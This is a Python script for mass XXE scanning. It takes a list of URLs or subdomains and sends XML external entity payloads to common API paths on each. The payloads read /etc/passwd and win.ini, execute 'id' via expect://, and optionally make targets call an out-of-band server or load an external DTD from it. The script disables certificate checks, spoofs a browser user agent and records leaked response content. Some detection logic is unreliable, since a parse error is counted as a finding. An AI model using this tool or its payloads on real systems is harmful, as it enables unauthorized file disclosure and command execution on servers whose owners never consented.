#!/usr/bin/env python3




import argparse
import requests
import time
import os
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
from tqdm import tqdm
import xml.etree.ElementTree as ET
from colorama import init, Fore

# Initialize colorama for colored output
init(autoreset=True)

# Default configuration
DEFAULT_THREADS = 20
DEFAULT_TIMEOUT = 15
DEFAULT_OUTPUT = "xxe_scan_results.json"
DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

def get_xxe_payloads(oob_server=None):
    """Generates XXE payloads with OOB (Out-of-Band) option"""
    payloads = [
        {
            "name": "Basic File Read",
            "payload": """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>""",
            "detection": ["root:", "daemon:", "bin/"]
        },
        {
            "name": "PHP Expect",
            "payload": """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY cmd SYSTEM "expect://id">]><root>&cmd;</root>""",
            "detection": ["uid=", "gid=", "groups="]
        },
        {
            "name": "Windows File Read",
            "payload": """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>""",
            "detection": ["[fonts]", "[extensions]", "[mci extensions]"]
        },
        {
            "name": "Internal DTD",
            "payload": """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % param1 "<!ENTITY external SYSTEM 'file:///etc/passwd'>"> %param1;]><root></root>""",
            "detection": ["root:", "daemon:", "bin/"]
        }
    ]
    
    # OOB payloads if server specified
    if oob_server:
        payloads.extend([
            {
                "name": "OOB Attack",
                "payload": f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "{oob_server}/xxe"> %xxe;]><root></root>""",
                "detection": ["OOB request received"]
            },
            {
                "name": "OOB with Parameter Entities",
                "payload": f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % param1 SYSTEM "{oob_server}/xxe.dtd"> %param1; %external;]><root></root>""",
                "detection": ["OOB request received"]
            }
        ])
    
    return payloads

def load_config(config_file):
    """Load configuration from JSON file"""
    if os.path.exists(config_file):
        with open(config_file, 'r') as f:
            return json.load(f)
    return None

def save_config(config_file, config):
    """Save configuration to JSON file"""
    with open(config_file, 'w') as f:
        json.dump(config, f, indent=4)

def test_endpoint(url, payload, headers, timeout, verbose=False):
    """Test an endpoint with specific XXE payload"""
    try:
        response = requests.post(
            url,
            data=payload["payload"],
            headers=headers,
            timeout=timeout,
            verify=False,
            allow_redirects=False
        )
        
        # Response analysis for vulnerability detection
        content = response.text.lower()
        for pattern in payload["detection"]:
            if pattern.lower() in content:
                return True, response
        
        # Check for parsing errors that might indicate XML processing
        if "xml" in response.headers.get('Content-Type', '').lower():
            try:
                ET.fromstring(response.text)
            except ET.ParseError:
                # Parse error might indicate XML was processed
                return True, response
        
        return False, response
    
    except requests.RequestException as e:
        if verbose:
            print(Fore.YELLOW + f"[!] Error with {url}: {str(e)}")
        return False, None

def scan_target(target, payloads, headers, timeout, endpoints, verbose=False):
    """Scan a single target with all payloads and endpoints"""
    results = []
    parsed_url = urlparse(target)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    
    for endpoint in endpoints:
        test_url = base_url + endpoint
        for payload in payloads:
            vulnerable, response = test_endpoint(test_url, payload, headers, timeout, verbose)
            if vulnerable:
                result = {
                    "url": test_url,
                    "status": "vuln",
                    "payload_name": payload["name"],
                    "payload_sample": payload["payload"][:100],
                    "http_status": response.status_code if response else 0,
                    "response_sample": response.text[:200] if response else ""
                }
                results.append(result)
                
                if verbose:
                    print(Fore.RED + f"[!] Vulnerability found at {test_url}")
                    print(Fore.RED + f"    Payload: {payload['name']}")
                    print(Fore.RED + f"    Status: {response.status_code if response else 'N/A'}\n")
                
                # If we find a vulnerability, move to next endpoint
                break
    
    if not results:
        return [{
            "url": base_url,
            "status": "no-vuln",
            "payload_name": "",
            "payload_sample": "",
            "http_status": 0,
            "response_sample": ""
        }]
    
    return results

def main():
    parser = argparse.ArgumentParser(description="Advanced XXE Vulnerability Scanner")
    parser.add_argument("-i", "--input", required=True, help="File with list of URLs/subdomains")
    parser.add_argument("-o", "--output", default=DEFAULT_OUTPUT, help="Output file for results")
    parser.add_argument("-t", "--threads", type=int, default=DEFAULT_THREADS, help="Number of concurrent threads")
    parser.add_argument("-to", "--timeout", type=int, default=DEFAULT_TIMEOUT, help="Timeout for HTTP requests")
    parser.add_argument("-c", "--config", help="JSON configuration file")
    parser.add_argument("-oa", "--oob-server", help="OOB (Out-of-Band) test server")
    parser.add_argument("-v", "--verbose", action="store_true", help="Show detailed output")
    args = parser.parse_args()

    # Load configuration
    config = {}
    if args.config:
        config = load_config(args.config) or {}
        if args.verbose:
            print(Fore.CYAN + "[*] Configuration loaded from file")

    # Configure payloads
    payloads = get_xxe_payloads(args.oob_server)
    
    # Configure endpoints to test
    endpoints = config.get("endpoints", [
        "",
        "/api",
        "/rest",
        "/soap",
        "/ws",
        "/xmlrpc",
        "/feed",
        "/rss",
        "/upload",
        "/import",
        "/graphql",
        "/v1/api",
        "/v2/api"
    ])
    
    # Configure headers
    headers = {
        'Content-Type': 'application/xml',
        'User-Agent': config.get('user_agent', DEFAULT_USER_AGENT)
    }
    
    # Load targets
    try:
        with open(args.input, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        
        # Add scheme if not present
        processed_targets = []
        for target in targets:
            if not target.startswith(('http://', 'https://')):
                processed_targets.append(f"http://{target}")
                processed_targets.append(f"https://{target}")
            else:
                processed_targets.append(target)
        
        if args.verbose:
            print(Fore.CYAN + f"[*] Loaded {len(processed_targets)} targets for scanning")
    except FileNotFoundError:
        print(Fore.RED + f"[!] Error: File not found {args.input}")
        return

    # Scan targets
    results = []
    total = len(processed_targets)
    
    print(Fore.GREEN + "\n[+] Starting XXE scan...\n")
    
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {
            executor.submit(
                scan_target,
                target,
                payloads,
                headers,
                args.timeout,
                endpoints,
                args.verbose
            ): target for target in processed_targets
        }
        
        for future in tqdm(as_completed(futures), total=total, desc="Progress", unit="target"):
            try:
                target_results = future.result()
                results.extend(target_results)
                
                # Periodically save results
                if len(results) % 100 == 0:
                    with open(args.output, 'w') as f:
                        json.dump(results, f, indent=4)
            except Exception as e:
                if args.verbose:
                    print(Fore.YELLOW + f"[!] Error processing target: {str(e)}")
    
    # Save final results
    with open(args.output, 'w') as f:
        json.dump(results, f, indent=4)
    
    # Show summary
    vuln_count = sum(1 for r in results if r["status"] == "vuln")
    print(Fore.GREEN + f"\n[+] Scan completed. Results saved to {args.output}")
    print(Fore.GREEN + f"[+] Total targets: {total}")
    print(Fore.GREEN + f"[+] Vulnerabilities found: {vuln_count}")
    print(Fore.GREEN + f"[+] Non-vulnerable targets: {total - vuln_count}\n")

if __name__ == "__main__":
    main()
